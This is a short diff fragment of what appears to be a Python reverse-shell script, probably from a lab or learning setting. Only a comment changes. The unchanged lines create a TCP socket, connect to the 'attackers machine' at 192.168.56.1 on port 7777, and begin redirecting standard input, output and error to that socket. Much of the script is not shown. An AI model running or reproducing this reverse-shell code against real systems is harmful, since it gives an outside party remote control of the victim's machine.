@@ -6,7 +6,7 @@ import os
 #create tcp socket
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
-#connect to attackers machine at ip 192.168.56.1, on port 7777
+#connect to attackers machine at ip address on specified port
 s.connect(("192.168.56.1", 7777))
 
 #redirect standard input, output, and error to the socket
